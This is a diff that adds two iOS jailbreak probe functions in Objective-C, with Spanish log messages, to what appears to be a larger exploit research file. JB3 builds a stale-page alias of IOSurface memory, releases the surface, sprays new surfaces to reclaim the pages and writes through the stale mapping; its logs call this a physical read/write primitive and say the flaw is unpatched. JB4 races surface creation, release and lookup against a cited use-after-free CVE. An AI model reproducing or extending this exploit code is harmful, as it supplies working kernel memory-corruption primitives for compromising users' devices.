@@ -22479,6 +22479,506 @@ void iosurface_research_struct_method(ISRLogBlock _Nonnull log, ISRDoneBlock _No
     });
 }
 
+#pragma mark - Probe JB3: Stale-Page Physical Alias (NO parcheado en 27.2)
+
+void iosurface_stale_page_alias(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
+    atomic_store(&g_isr_stop, false);
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
+        log(@"JB3: ========================================");
+        log(@"JB3: Stale-Page Physical Alias Probe");
+        log(@"JB3: ========================================");
+
+        void *h = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
+        if (!h) { log(@"JB3: No se pudo abrir IOSurface.framework"); done(@{@"error": @"dlopen"}); return; }
+
+        typedef IOSurfaceRef (*CreateFn)(CFDictionaryRef);
+        CreateFn createSurf = (CreateFn)dlsym(h, "IOSurfaceCreate");
+        typedef uint32_t (*GetIDFn)(IOSurfaceRef);
+        GetIDFn getID = (GetIDFn)dlsym(h, "IOSurfaceGetID");
+        typedef void* (*GetBaseFn)(IOSurfaceRef);
+        GetBaseFn getBase = (GetBaseFn)dlsym(h, "IOSurfaceGetBaseAddress");
+        typedef size_t (*GetAllocSzFn)(IOSurfaceRef);
+        GetAllocSzFn getAllocSz = (GetAllocSzFn)dlsym(h, "IOSurfaceGetAllocSize");
+        typedef kern_return_t (*LockFn)(IOSurfaceRef, uint32_t, uint32_t *);
+        LockFn lockS = (LockFn)dlsym(h, "IOSurfaceLock");
+        typedef kern_return_t (*UnlockFn)(IOSurfaceRef, uint32_t, uint32_t *);
+        UnlockFn unlockS = (UnlockFn)dlsym(h, "IOSurfaceUnlock");
+
+        typedef kern_return_t (*MakeEntryFn)(vm_map_t, memory_object_size_t *,
+            memory_object_offset_t, vm_prot_t, mach_port_t *,
+            mem_entry_name_port_t);
+        MakeEntryFn makeEntry = (MakeEntryFn)dlsym(RTLD_DEFAULT, "mach_make_memory_entry_64");
+
+        if (!createSurf || !getBase || !makeEntry) {
+            log([NSString stringWithFormat:@"JB3: Funciones: create=%d base=%d makeEntry=%d",
+                 createSurf!=NULL, getBase!=NULL, makeEntry!=NULL]);
+            dlclose(h);
+            done(@{@"error": @"dlsym"});
+            return;
+        }
+        log(@"JB3: Todas las funciones cargadas OK");
+
+        log(@"JB3: --- Paso 1: Crear superficie PurpleGfxMem ---");
+        NSDictionary *props = @{
+            @"IOSurfaceWidth": @64,
+            @"IOSurfaceHeight": @64,
+            @"IOSurfaceBytesPerElement": @4,
+            @"IOSurfacePixelFormat": @(0x42475241),
+            @"IOSurfaceMemoryRegion": @"PurpleGfxMem",
+        };
+        IOSurfaceRef surf = createSurf((__bridge CFDictionaryRef)props);
+        if (!surf) {
+            log(@"JB3: Creación PurpleGfxMem falló, probando sin region...");
+            NSDictionary *fallback = @{
+                @"IOSurfaceWidth": @64,
+                @"IOSurfaceHeight": @64,
+                @"IOSurfaceBytesPerElement": @4,
+                @"IOSurfacePixelFormat": @(0x42475241),
+            };
+            surf = createSurf((__bridge CFDictionaryRef)fallback);
+            if (!surf) {
+                log(@"JB3: IOSurfaceCreate falló completamente");
+                dlclose(h);
+                done(@{@"error": @"create_fail"});
+                return;
+            }
+            log(@"JB3: Superficie creada sin PurpleGfxMem (fallback)");
+        } else {
+            log(@"JB3: *** Superficie PurpleGfxMem creada! ***");
+        }
+
+        uint32_t surfID = getID ? getID(surf) : 0;
+        size_t allocSz = getAllocSz ? getAllocSz(surf) : 0;
+        void *base = NULL;
+
+        if (lockS) {
+            uint32_t seed = 0;
+            lockS(surf, 3, &seed);
+        }
+        base = getBase(surf);
+        log([NSString stringWithFormat:@"JB3: ID=%u AllocSize=%zu Base=%p", surfID, allocSz, base]);
+
+        if (!base || allocSz == 0) {
+            log(@"JB3: BaseAddress NULL o AllocSize 0 — no se puede continuar");
+            if (unlockS) { uint32_t s = 0; unlockS(surf, 3, &s); }
+            CFRelease(surf);
+            dlclose(h);
+            done(@{@"error": @"no_base"});
+            return;
+        }
+
+        log(@"JB3: --- Paso 2: Escribir marcador en la superficie ---");
+        uint32_t marker = 0xDEAD1337;
+        memset(base, 0, allocSz < 4096 ? allocSz : 4096);
+        memcpy(base, &marker, sizeof(marker));
+        uint32_t readBack = 0;
+        memcpy(&readBack, base, sizeof(readBack));
+        log([NSString stringWithFormat:@"JB3: Marcador escrito: 0x%08X leído: 0x%08X", marker, readBack]);
+
+        if (unlockS) { uint32_t s = 0; unlockS(surf, 3, &s); }
+
+        log(@"JB3: --- Paso 3: mach_make_memory_entry_64 ---");
+        mach_port_t entryPort = MACH_PORT_NULL;
+        memory_object_size_t entrySize = (memory_object_size_t)allocSz;
+        kern_return_t mkr = makeEntry(mach_task_self(), &entrySize,
+            (memory_object_offset_t)(uintptr_t)base,
+            VM_PROT_READ | VM_PROT_WRITE, &entryPort, MACH_PORT_NULL);
+
+        log([NSString stringWithFormat:@"JB3: mach_make_memory_entry_64 kr=%d port=%u size=%llu",
+             mkr, entryPort, (uint64_t)entrySize]);
+
+        if (mkr != KERN_SUCCESS || entryPort == MACH_PORT_NULL) {
+            log(@"JB3: memory entry falló — probando con solo READ...");
+            entrySize = (memory_object_size_t)allocSz;
+            mkr = makeEntry(mach_task_self(), &entrySize,
+                (memory_object_offset_t)(uintptr_t)base,
+                VM_PROT_READ, &entryPort, MACH_PORT_NULL);
+            log([NSString stringWithFormat:@"JB3: Retry READ-only kr=%d port=%u", mkr, entryPort]);
+        }
+
+        if (mkr != KERN_SUCCESS || entryPort == MACH_PORT_NULL) {
+            log(@"JB3: No se pudo crear memory entry");
+            CFRelease(surf);
+            dlclose(h);
+            done(@{@"error": @"memory_entry_fail"});
+            return;
+        }
+
+        log(@"JB3: --- Paso 4: vm_map del memory entry (alias) ---");
+        vm_address_t alias = 0;
+        kern_return_t vmkr = vm_map(mach_task_self(), &alias, (vm_size_t)entrySize,
+            0, VM_FLAGS_ANYWHERE, entryPort, 0, FALSE,
+            VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE,
+            VM_INHERIT_NONE);
+
+        log([NSString stringWithFormat:@"JB3: vm_map kr=%d alias=%p", vmkr, (void*)alias]);
+
+        if (vmkr != KERN_SUCCESS) {
+            log(@"JB3: vm_map falló");
+            mach_port_deallocate(mach_task_self(), entryPort);
+            CFRelease(surf);
+            dlclose(h);
+            done(@{@"error": @"vm_map_fail"});
+            return;
+        }
+
+        uint32_t aliasRead = 0;
+        memcpy(&aliasRead, (void*)alias, sizeof(aliasRead));
+        log([NSString stringWithFormat:@"JB3: *** Alias lee marcador: 0x%08X (esperado 0xDEAD1337) match=%s ***",
+             aliasRead, (aliasRead == marker) ? "SI" : "NO"]);
+
+        log(@"JB3: --- Paso 5: Escribir por alias, leer por base ---");
+        uint32_t aliasMarker = 0xCAFEBABE;
+        memcpy((void*)alias, &aliasMarker, sizeof(aliasMarker));
+        if (lockS) { uint32_t s = 0; lockS(surf, 3, &s); }
+        uint32_t baseRead2 = 0;
+        memcpy(&baseRead2, getBase(surf), sizeof(baseRead2));
+        if (unlockS) { uint32_t s = 0; unlockS(surf, 3, &s); }
+        log([NSString stringWithFormat:@"JB3: Alias escribió 0xCAFEBABE, base lee: 0x%08X match=%s",
+             baseRead2, (baseRead2 == aliasMarker) ? "SI" : "NO"]);
+        int bidirectional = (aliasRead == marker && baseRead2 == aliasMarker);
+        log([NSString stringWithFormat:@"JB3: *** ALIAS BIDIRECCIONAL: %s ***",
+             bidirectional ? "CONFIRMADO" : "FALLIDO"]);
+
+        log(@"JB3: --- Paso 6: CFRelease superficie, alias persiste? ---");
+        CFRelease(surf);
+        surf = NULL;
+
+        uint32_t staleRead1 = 0;
+        memcpy(&staleRead1, (void*)alias, sizeof(staleRead1));
+        log([NSString stringWithFormat:@"JB3: Post-release alias lee: 0x%08X (stale=%s)",
+             staleRead1, (staleRead1 == aliasMarker) ? "SI-STALE" : "CAMBIÓ"]);
+
+        if (!isr_stopped()) {
+            log(@"JB3: --- Paso 7: Spray 50 superficies para reclamar páginas ---");
+            IOSurfaceRef sprays[50];
+            int sprayed = 0;
+            uint32_t sprayMarker = 0xBBBBBBBB;
+            for (int i = 0; i < 50 && !isr_stopped(); i++) {
+                NSDictionary *sp = @{
+                    @"IOSurfaceWidth": @64,
+                    @"IOSurfaceHeight": @64,
+                    @"IOSurfaceBytesPerElement": @4,
+                    @"IOSurfacePixelFormat": @(0x42475241),
+                };
+                sprays[i] = createSurf((__bridge CFDictionaryRef)sp);
+                if (sprays[i]) {
+                    if (lockS) { uint32_t s = 0; lockS(sprays[i], 3, &s); }
+                    void *sb = getBase(sprays[i]);
+                    if (sb) memcpy(sb, &sprayMarker, sizeof(sprayMarker));
+                    if (unlockS) { uint32_t s = 0; unlockS(sprays[i], 3, &s); }
+                    sprayed++;
+                }
+            }
+            log([NSString stringWithFormat:@"JB3: Spray: %d/50 superficies creadas", sprayed]);
+
+            uint32_t staleRead2 = 0;
+            memcpy(&staleRead2, (void*)alias, sizeof(staleRead2));
+            log([NSString stringWithFormat:@"JB3: Post-spray alias lee: 0x%08X", staleRead2]);
+
+            if (staleRead2 == sprayMarker) {
+                log(@"JB3: *** RECLAMACIÓN EXITOSA — ALIAS VE DATOS DEL SPRAY ***");
+                log(@"JB3: *** PRIMITIVA DE LECTURA/ESCRITURA STALE-PAGE CONFIRMADA ***");
+
+                uint32_t writeViaStale = 0x41414141;
+                memcpy((void*)alias, &writeViaStale, sizeof(writeViaStale));
+                log(@"JB3: Escrito 0x41414141 vía alias stale");
+
+                for (int i = 0; i < sprayed; i++) {
+                    if (!sprays[i]) continue;
+                    if (lockS) { uint32_t s = 0; lockS(sprays[i], 3, &s); }
+                    void *sb = getBase(sprays[i]);
+                    if (sb) {
+                        uint32_t v = 0;
+                        memcpy(&v, sb, sizeof(v));
+                        if (v == writeViaStale) {
+                            uint32_t sid = getID ? getID(sprays[i]) : 0;
+                            log([NSString stringWithFormat:
+                                @"JB3: *** ESCRITURA STALE CONFIRMADA en superficie %d (ID=%u) ***", i, sid]);
+                        }
+                    }
+                    if (unlockS) { uint32_t s = 0; unlockS(sprays[i], 3, &s); }
+                }
+            } else if (staleRead2 == aliasMarker) {
+                log(@"JB3: Alias aún tiene datos viejos — páginas no reclamadas por spray");
+                log(@"JB3: Las páginas PurpleGfxMem solo se reciclan entre IOSurfaces");
+            } else {
+                log([NSString stringWithFormat:@"JB3: Contenido cambió a 0x%08X — reciclado por otro subsistema", staleRead2]);
+            }
+
+            for (int i = 0; i < sprayed; i++) {
+                if (sprays[i]) CFRelease(sprays[i]);
+            }
+        }
+
+        log(@"JB3: --- Paso 8: Spray PurpleGfxMem para reclamar ---");
+        if (!isr_stopped()) {
+            uint32_t pgmMarker = 0xAAAAAAAA;
+            IOSurfaceRef pgmSprays[30];
+            int pgmCount = 0;
+            for (int i = 0; i < 30 && !isr_stopped(); i++) {
+                NSDictionary *pp = @{
+                    @"IOSurfaceWidth": @64,
+                    @"IOSurfaceHeight": @64,
+                    @"IOSurfaceBytesPerElement": @4,
+                    @"IOSurfacePixelFormat": @(0x42475241),
+                    @"IOSurfaceMemoryRegion": @"PurpleGfxMem",
+                };
+                pgmSprays[i] = createSurf((__bridge CFDictionaryRef)pp);
+                if (pgmSprays[i]) {
+                    if (lockS) { uint32_t s = 0; lockS(pgmSprays[i], 3, &s); }
+                    void *sb = getBase(pgmSprays[i]);
+                    if (sb) memcpy(sb, &pgmMarker, sizeof(pgmMarker));
+                    if (unlockS) { uint32_t s = 0; unlockS(pgmSprays[i], 3, &s); }
+                    pgmCount++;
+                } else {
+                    break;
+                }
+            }
+            log([NSString stringWithFormat:@"JB3: PurpleGfxMem spray: %d/30", pgmCount]);
+
+            uint32_t staleRead3 = 0;
+            memcpy(&staleRead3, (void*)alias, sizeof(staleRead3));
+            log([NSString stringWithFormat:@"JB3: Post-PGM-spray alias lee: 0x%08X", staleRead3]);
+
+            if (staleRead3 == pgmMarker) {
+                log(@"JB3: *** PurpleGfxMem RECLAMÓ LAS PÁGINAS ***");
+                log(@"JB3: *** ALIAS STALE VE DATOS DEL SPRAY PGM ***");
+                log(@"JB3: *** ESTO ES UNA PRIMITIVA DE R/W FÍSICA ***");
+
+                uint32_t poison = 0x42424242;
+                memcpy((void*)alias, &poison, sizeof(poison));
+
+                for (int i = 0; i < pgmCount; i++) {
+                    if (!pgmSprays[i]) continue;
+                    if (lockS) { uint32_t s = 0; lockS(pgmSprays[i], 3, &s); }
+                    void *sb = getBase(pgmSprays[i]);
+                    if (sb) {
+                        uint32_t v = 0;
+                        memcpy(&v, sb, sizeof(v));
+                        if (v == poison) {
+                            uint32_t sid = getID ? getID(pgmSprays[i]) : 0;
+                            log([NSString stringWithFormat:
+                                @"JB3: *** ESCRITURA CROSS-SURFACE CONFIRMADA PGM[%d] ID=%u ***", i, sid]);
+                        }
+                    }
+                    if (unlockS) { uint32_t s = 0; unlockS(pgmSprays[i], 3, &s); }
+                }
+            }
+
+            for (int i = 0; i < pgmCount; i++) {
+                if (pgmSprays[i]) CFRelease(pgmSprays[i]);
+            }
+        }
+
+        vm_deallocate(mach_task_self(), alias, (vm_size_t)entrySize);
+        mach_port_deallocate(mach_task_self(), entryPort);
+
+        log(@"JB3: ========================================");
+        log(@"JB3: Stale-Page Alias Probe completado.");
+        log(@"JB3: ========================================");
+
+        dlclose(h);
+        done(@{@"phase3": @"complete"});
+    });
+}
+
+#pragma mark - Probe JB4: IOSurface Notify UAF Race (CVE-2026-112477)
+
+void iosurface_notify_uaf_race(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
+    atomic_store(&g_isr_stop, false);
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
+        log(@"JB4: ========================================");
+        log(@"JB4: IOSurface Notify UAF Race (CVE-2026-112477)");
+        log(@"JB4: ========================================");
+
+        void *h = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
+        if (!h) { log(@"JB4: No se pudo abrir IOSurface.framework"); done(@{@"error": @"dlopen"}); return; }
+
+        typedef IOSurfaceRef (*CreateFn)(CFDictionaryRef);
+        CreateFn createSurf = (CreateFn)dlsym(h, "IOSurfaceCreate");
+        typedef uint32_t (*GetIDFn)(IOSurfaceRef);
+        GetIDFn getID = (GetIDFn)dlsym(h, "IOSurfaceGetID");
+        typedef void* (*GetBaseFn)(IOSurfaceRef);
+        GetBaseFn getBase = (GetBaseFn)dlsym(h, "IOSurfaceGetBaseAddress");
+        typedef kern_return_t (*LockFn)(IOSurfaceRef, uint32_t, uint32_t *);
+        LockFn lockS = (LockFn)dlsym(h, "IOSurfaceLock");
+        typedef kern_return_t (*UnlockFn)(IOSurfaceRef, uint32_t, uint32_t *);
+        UnlockFn unlockS = (UnlockFn)dlsym(h, "IOSurfaceUnlock");
+        typedef void (*IncUseFn)(IOSurfaceRef);
+        IncUseFn incUse = (IncUseFn)dlsym(h, "IOSurfaceIncrementUseCount");
+        typedef void (*DecUseFn)(IOSurfaceRef);
+        DecUseFn decUse = (DecUseFn)dlsym(h, "IOSurfaceDecrementUseCount");
+        typedef int32_t (*GetUseFn)(IOSurfaceRef);
+        GetUseFn getUse = (GetUseFn)dlsym(h, "IOSurfaceGetUseCount");
+        typedef IOSurfaceRef (*LookupFn)(uint32_t);
+        LookupFn lookup = (LookupFn)dlsym(h, "IOSurfaceLookup");
+
+        typedef kern_return_t (*SetNotifyFn)(mach_port_t, uint64_t, uint64_t);
+        SetNotifyFn setNotify = (SetNotifyFn)dlsym(h, "IOSurfaceClientSetSurfaceNotify");
+        typedef kern_return_t (*RemoveNotifyFn)(uint64_t);
+        RemoveNotifyFn removeNotify = (RemoveNotifyFn)dlsym(h, "IOSurfaceClientRemoveSurfaceNotify");
+
+        log([NSString stringWithFormat:@"JB4: Funciones: create=%d id=%d base=%d lock=%d inc=%d dec=%d use=%d lookup=%d",
+             createSurf!=NULL, getID!=NULL, getBase!=NULL, lockS!=NULL,
+             incUse!=NULL, decUse!=NULL, getUse!=NULL, lookup!=NULL]);
+        log([NSString stringWithFormat:@"JB4: Notify: setNotify=%d removeNotify=%d",
+             setNotify!=NULL, removeNotify!=NULL]);
+
+        if (!createSurf) {
+            log(@"JB4: IOSurfaceCreate no disponible");
+            dlclose(h);
+            done(@{@"error": @"no_create"});
+            return;
+        }
+
+        log(@"JB4: --- Paso 1: Probar UseCount como trigger de notificaciones ---");
+        NSDictionary *props = @{
+            @"IOSurfaceWidth": @32,
+            @"IOSurfaceHeight": @32,
+            @"IOSurfaceBytesPerElement": @4,
+            @"IOSurfacePixelFormat": @(0x42475241),
+        };
+
+        IOSurfaceRef testSurf = createSurf((__bridge CFDictionaryRef)props);
+        if (testSurf && incUse && decUse && getUse) {
+            uint32_t testID = getID ? getID(testSurf) : 0;
+            log([NSString stringWithFormat:@"JB4: Superficie test ID=%u", testID]);
+
+            int32_t uc0 = getUse(testSurf);
+            for (int i = 0; i < 100; i++) incUse(testSurf);
+            int32_t uc100 = getUse(testSurf);
+            for (int i = 0; i < 100; i++) decUse(testSurf);
+            int32_t ucEnd = getUse(testSurf);
+            log([NSString stringWithFormat:@"JB4: UseCount: inicio=%d +100=%d -100=%d", uc0, uc100, ucEnd]);
+
+            for (int i = 0; i < 200; i++) decUse(testSurf);
+            int32_t ucDeep = getUse(testSurf);
+            log([NSString stringWithFormat:@"JB4: UseCount deep underflow: %d", ucDeep]);
+            if (ucDeep < 0) {
+                log(@"JB4: *** USECOUNT NEGATIVO ALCANZADO ***");
+            } else {
+                log(@"JB4: UseCount clampea en 0 (no permite negativo simple)");
+            }
+            for (int i = 0; i < 200; i++) incUse(testSurf);
+            for (int i = 0; i < 200; i++) decUse(testSurf);
+
+            CFRelease(testSurf);
+        }
+
+        if (!isr_stopped() && setNotify) {
+            log(@"JB4: --- Paso 2: SetSurfaceNotify disponible — probar registro ---");
+
+            IOSurfaceRef notifySurf = createSurf((__bridge CFDictionaryRef)props);
+            if (notifySurf) {
+                uint32_t nID = getID ? getID(notifySurf) : 0;
+                log([NSString stringWithFormat:@"JB4: Superficie para notify ID=%u", nID]);
+
+                mach_port_t notifyPort = MACH_PORT_NULL;
+                mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &notifyPort);
+                mach_port_insert_right(mach_task_self(), notifyPort, notifyPort, MACH_MSG_TYPE_MAKE_SEND);
+
+                kern_return_t nkr = setNotify(notifyPort, (uint64_t)nID, 0);
+                log([NSString stringWithFormat:@"JB4: SetSurfaceNotify kr=%d port=%u surfID=%u", nkr, notifyPort, nID]);
+
+                if (nkr == KERN_SUCCESS) {
+                    log(@"JB4: *** NOTIFY REGISTRADO — ventana UAF existe ***");
+
+                    if (incUse) {
+                        incUse(notifySurf);
+                        log(@"JB4: IncrementUseCount llamado (trigger de dispatchNotify)");
+                    }
+
+                    if (removeNotify) {
+                        kern_return_t rkr = removeNotify((uint64_t)nID);
+                        log([NSString stringWithFormat:@"JB4: RemoveSurfaceNotify kr=%d", rkr]);
+                    }
+                } else {
+                    log(@"JB4: SetSurfaceNotify no disponible o rechazado en iOS 27.0");
+                }
+
+                if (notifyPort != MACH_PORT_NULL) {
+                    mach_port_mod_refs(mach_task_self(), notifyPort, MACH_PORT_RIGHT_RECEIVE, -1);
+                }
+                CFRelease(notifySurf);
+            }
+        } else if (!setNotify) {
+            log(@"JB4: SetSurfaceNotify no encontrado — probando UseCount race sin notify");
+        }
+
+        if (!isr_stopped()) {
+            log(@"JB4: --- Paso 3: Race Create/Release + Lookup ---");
+            __block volatile int32_t raceHits = 0;
+            __block volatile int32_t raceMiss = 0;
+            __block volatile int32_t raceUAF = 0;
+            __block volatile uint32_t sharedIDs[64];
+            __block volatile int32_t idIdx = 0;
+            memset((void*)sharedIDs, 0, sizeof(sharedIDs));
+
+            dispatch_group_t group = dispatch_group_create();
+            dispatch_queue_t q1 = dispatch_queue_create("jb4.creator", DISPATCH_QUEUE_SERIAL);
+            dispatch_queue_t q2 = dispatch_queue_create("jb4.looker", DISPATCH_QUEUE_SERIAL);
+
+            dispatch_group_async(group, q1, ^{
+                for (int i = 0; i < 500 && !isr_stopped(); i++) {
+                    @autoreleasepool {
+                        IOSurfaceRef s = createSurf((__bridge CFDictionaryRef)props);
+                        if (s) {
+                            uint32_t sid = getID ? getID(s) : 0;
+                            int32_t idx = OSAtomicIncrement32((volatile int32_t*)&idIdx) - 1;
+                            sharedIDs[idx % 64] = sid;
+                            usleep(50);
+                            CFRelease(s);
+                        }
+                    }
+                }
+            });
+
+            dispatch_group_async(group, q2, ^{
+                for (int i = 0; i < 2000 && !isr_stopped(); i++) {
+                    @autoreleasepool {
+                        int32_t curIdx = idIdx;
+                        if (curIdx <= 0) { usleep(10); continue; }
+                        uint32_t sid = sharedIDs[(curIdx - 1) % 64];
+                        if (sid == 0) continue;
+
+                        IOSurfaceRef looked = lookup ? lookup(sid) : NULL;
+                        if (looked) {
+                            OSAtomicIncrement32((volatile int32_t*)&raceHits);
+                            void *b = getBase ? getBase(looked) : NULL;
+                            if (b) {
+                                uint32_t val = 0;
+                                memcpy(&val, b, sizeof(val));
+                                if (val == 0xDEADDEAD || val == 0xFEEDFACE) {
+                                    OSAtomicIncrement32((volatile int32_t*)&raceUAF);
+                                }
+                            }
+                            CFRelease(looked);
+                        } else {
+                            OSAtomicIncrement32((volatile int32_t*)&raceMiss);
+                        }
+                    }
+                }
+            });
+
+            dispatch_group_wait(group, DISPATCH_TIME_FOREVER);
+            log([NSString stringWithFormat:@"JB4: Race result: hits=%d miss=%d uaf_patterns=%d",
+                 raceHits, raceMiss, raceUAF]);
+            if (raceMiss > 0) {
+                log([NSString stringWithFormat:@"JB4: *** %d LOOKUP FALLIDOS — superficie ya liberada ***", raceMiss]);
+                log(@"JB4: Ventana de race confirmada entre Create/Release y Lookup");
+            }
+        }
+
+        log(@"JB4: ========================================");
+        log(@"JB4: Notify UAF Race Probe completado.");
+        log(@"JB4: ========================================");
+
+        dlclose(h);
+        done(@{@"phase4": @"complete"});
+    });
+}
+
 #pragma mark - Probe 99: Surface Lifecycle TOCTOU Race
 
 static volatile sig_atomic_t g_lifecycle_segv_count = 0;
